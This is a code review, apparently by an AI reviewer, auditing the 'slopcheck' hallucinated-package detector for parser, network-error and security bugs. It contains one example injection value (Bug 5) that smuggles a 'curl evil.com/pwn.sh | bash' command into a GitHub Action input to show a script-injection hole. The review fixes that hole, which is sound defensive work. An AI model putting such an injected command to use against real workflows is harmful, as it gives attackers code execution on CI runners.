# slopcheck v0.5.0 -- Code Review

**Reviewer:** Claude (ToxSec)
**Date:** 2026-03-31
**Scope:** Full codebase audit. Bugs, security, correctness, edge cases.

---

## BUGS -- Fix Before Ship

### BUG 1: Network errors get classified as SLOP (Critical)

**File:** `registries.py`, all `check_*` functions
**Lines:** Every registry checker's `except RequestException` block

Every registry checker catches `RequestException` and returns `exists=False`. The detection engine then sees `exists=False` and stamps it **SLOP**. So if PyPI is down, rate-limiting you, or your Wi-Fi drops for 3 seconds, `requests` (the package literally everyone uses) gets flagged as a hallucinated package.

This is the worst bug in the codebase. A flaky network turns every package into SLOP. In CI, this means a transient 429 or 503 from any registry **blocks your deploy**.

**Repro:**
```python
info = PackageInfo(name='requests', ecosystem='pypi', exists=False, error='Connection timed out')
v = analyze(info)
# v.status == "SLOP"  -- wrong. Should be "ERROR" or retry.
```

**Fix:** Add an `error` status to `Verdict`. If `PackageInfo.error` is set, the detection engine should return a verdict with `status="ERROR"` instead of `SLOP`. The CLI should print a warning and the exit code logic should treat errors as non-blocking (or offer a `--strict` flag). At minimum, don't tell the user their AI hallucinated a package when the real problem is DNS resolution.

---

### BUG 2: `requirements.txt` parser eats git+/URL/path lines (Medium)

**File:** `parsers.py`, `parse_requirements_txt()`
**Line 14:** Only skips lines starting with `-`

Lines like `git+https://github.com/foo/bar.git` and `./local-package` get parsed. The regex splits on `[>=<!\[;@\s]` which hits the `+` in `git+https` or the `/` boundary, pulling out garbage like `git+https://github.com/foo/bar.git` as a "package name". That then gets sent to PyPI, which 404s, and you get a false SLOP flag.

**Repro:**
```
git+https://github.com/foo/bar.git   -> ('pypi', 'git+https://github.com/foo/bar.git')
./local-package                       -> ('pypi', './local-package')
https://example.com/foo.whl          -> ('pypi', 'https://example.com/foo.whl')
```

**Fix:** Skip lines that start with `git+`, `http://`, `https://`, `./`, `../`, or `file:`. Also skip lines containing `://` anywhere. These are direct references, not registry package names.

---

### BUG 3: Cargo.toml misses `[build-dependencies]` and `[dependencies.X]` tables (Medium)

**File:** `parsers.py`, `parse_cargo_toml()`
**Line 132:** Only checks for exact `[dependencies]` and `[dev-dependencies]`

Rust projects commonly use `[build-dependencies]` for build scripts (e.g., `cc`, `bindgen`) and the dotted table syntax `[dependencies.reqwest]` for per-dependency configuration. Both are silently skipped.

**Repro:**
```toml
[build-dependencies]
cc = "1.0"           # missed

[dependencies.reqwest]
version = "0.11"     # missed
features = ["json"]
```

**Fix:** Add `[build-dependencies]` to the section check. For dotted tables, match `[dependencies.` prefix and extract the crate name from the section header itself.

---

### BUG 4: Maven `timestamp` is last-updated, not created (Low-Medium)

**File:** `registries.py`, `check_maven()`
**Line 265-269**

The Maven Central search API's `timestamp` field is the timestamp of the **latest version upload**, not the first publish date. An ancient library like Guava that just pushed a release yesterday would show `age_days=1`, triggering the `BRAND_NEW` critical flag and getting stamped SLOP.

**Fix:** Maven Central doesn't expose first-publish date easily. Options: (a) use the `versionCount` field as a proxy for maturity, (b) query the oldest version endpoint, or (c) drop the age check for Maven and document the limitation.

---

### BUG 5: `action.yml` script injection via `inputs.path` (Security)

**File:** `action.yml`
**Line 48:** `OUTPUT=$(slopcheck "${{ inputs.path }}" --json 2>&1)`

The `${{ inputs.path }}` expression gets interpolated directly into the shell command **before** bash sees it. A malicious PR author could set `path` in the workflow dispatch to `"; curl evil.com/pwn.sh | bash; #"` and get RCE on the runner.

This is a known GitHub Actions footgun. Any `${{ inputs.* }}` or `${{ github.event.* }}` in a `run:` block is injectable.

**Fix:** Pass the input through an environment variable instead:

```yaml
- name: Run slopcheck
  id: scan
  shell: bash
  env:
    SCAN_PATH: ${{ inputs.path }}
  run: |
    set +e
    OUTPUT=$(slopcheck "$SCAN_PATH" --json 2>&1)
    ...
```

Environment variables are not subject to shell interpolation the same way. The `"$SCAN_PATH"` quoting handles spaces and special chars safely.

Also applies to line 67: `slopcheck "${{ inputs.path }}" 2>&1 || true`

---

## ISSUES -- Should Fix

### ISSUE 1: CLI arg injection breaks on flags-first invocation

**File:** `cli.py`, line 536

The backwards-compat hack checks if `sys.argv[1]` is a known command, and if not, injects `"scan"`. This breaks when users pass flags before the target:

```bash
slopcheck --json .          # becomes: slopcheck scan --json .  (works by accident)
slopcheck --workers 5 .     # becomes: slopcheck scan --workers 5 .  (works)
slopcheck --fix             # becomes: slopcheck scan --fix  (no target, uses default ".")
slopcheck --version         # becomes: slopcheck scan --version  (breaks)
```

The `--json` and `--fix` cases actually work because argparse is flexible. But `--version` or any future top-level flag will route into the scan subcommand incorrectly.

**Fix:** Check if `sys.argv[1]` starts with `--` and handle flags separately, or just accept that the scan subcommand is implicit and document that flags come after the target.

---

### ISSUE 2: Allowlist walk-up can escape to filesystem root

**File:** `allowlist.py`, `_find_allowlist()`
**Line 20-21**

If there's no `.git` directory anywhere in the path (e.g., user runs slopcheck in `/tmp/test/`), the walk-up goes all the way to `/` and returns `/.slopcheck` as the default location. If the user then runs `slopcheck allow my-pkg`, it tries to create `/.slopcheck` at the filesystem root, which will fail with a permission error on most systems (or succeed on a container/CI runner, which is weird).

**Fix:** Add a max-depth limit or fall back to the current working directory when no `.git` boundary is found.

---

### ISSUE 3: `auto_detect` doesn't recurse into subdirectories

**File:** `parsers.py`, `auto_detect()`
**Line 316-323**

Only checks the immediate directory for dependency files. Monorepos with `packages/foo/package.json` or `services/bar/requirements.txt` are invisible. Not necessarily a bug since you can pass specific files, but the README says "auto-detect dependency files" which implies more thorough scanning.

Worth documenting the limitation or adding a `--recursive` flag.

---

### ISSUE 4: `detect.py` status logic collapses warns=1 and warns>=2

**File:** `detect.py`, lines 276-278

```python
elif warns >= 2:
    status = "SUS"
elif warns == 1:
    status = "SUS"
```

Both branches do the same thing. This looks like a leftover from when you considered having different thresholds. Either collapse them into `elif warns > 0:` or implement the intended distinction (maybe `warns >= 2` = SUS, `warns == 1` = OK with info?).

---

### ISSUE 5: Thread-unsafe output in terminal mode

**File:** `cli.py`, `_check_packages()`

`print_verdict()` is called from `as_completed()` futures, which means multiple threads can interleave their `print()` calls. Python's `print()` is generally atomic for single calls, but `print_verdict` makes 2-4 separate `print()` calls per package. Under heavy parallelism (default 10 workers), output from different packages can interleave line-by-line.

Low priority since it's cosmetic, but it'd look bad in a demo. Quick fix: build the full output string and print it in one call.

---

## NITS -- Nice to Have

1. **`registries.py` line 155:** `headers = {"User-Agent": "slopcheck/0.5 ..."}` -- hardcoded version. Should pull from `__version__`.

2. **`fixer.py` line 196:** `FILE_FIXERS: Dict[str, callable]` -- `callable` should be `Callable` (from typing). Lowercase `callable` is the builtin, not the type hint. Works at runtime but fails strict mypy.

3. **`parsers.py`:** No support for `requirements/*.txt` glob patterns (common in larger projects that split deps into `requirements/base.txt`, `requirements/prod.txt`, etc.).

4. **`detect.py`:** The popular packages list is static. Consider loading from a config file or caching a live top-1000 list. The current list is good enough for typosquat checks but will drift over time.

5. **`cli.py` line 284:** `deps = list(set(deps))` deduplicates but loses ordering. `dict.fromkeys(deps)` preserves first-seen order.

6. **No test suite.** For a security tool about to be publicly promoted, even a minimal pytest suite covering the parser and detection logic would catch regressions. The parsers especially have enough edge cases that manual testing won't scale.

---

## Summary

| Severity | Count | Ship-blocking? |
|----------|-------|----------------|
| Critical bugs | 2 (network-as-SLOP, action.yml injection) | Yes |
| Medium bugs | 3 (requirements.txt URLs, Cargo.toml sections, Maven timestamp) | Depends on scope |
| Issues | 5 | No, but worth tracking |
| Nits | 6 | No |

**The two critical bugs should be fixed before the article drops.** Bug 1 (network errors = SLOP) will hit every user who runs this on spotty Wi-Fi or in a rate-limited CI environment. Bug 5 (action.yml injection) is an actual security vuln in a security tool, which is a bad look.

The requirements.txt parser bug (Bug 2) is also worth fixing since it'll trigger false positives on any project that uses git+ dependencies, which is pretty common in Python shops.

Everything else is polish.
